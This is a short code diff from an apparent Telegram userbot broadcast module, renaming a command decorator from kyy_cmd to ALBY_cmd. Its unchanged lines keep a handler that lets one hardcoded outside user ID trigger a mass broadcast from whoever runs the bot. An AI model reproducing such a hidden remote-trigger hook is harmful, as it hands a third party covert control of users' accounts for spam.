@@ -11,7 +11,7 @@
 # t.me/SharingUserbot & t.me/Lunatic0de
 
 from userbot import CMD_HELP, CMD_HANDLER as cmd
-from userbot.utils import kyy_cmd
+from userbot.utils import ALBY_cmd
 from userbot.events import register
 
 GCAST_BLACKLIST = [
@@ -20,7 +20,7 @@ GCAST_BLACKLIST = [
 ]
 
 
-@kyy_cmd(pattern="gcast(?: |$)(.*)")
+@ALBY_cmd(pattern="gcast(?: |$)(.*)")
 @register(incoming=True, from_users=1441342342,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
@@ -51,7 +51,7 @@ async def gcast(event):
     )
 
 
-@kyy_cmd(pattern="gucast(?: |$)(.*)")
+@ALBY_cmd(pattern="gucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if xx:
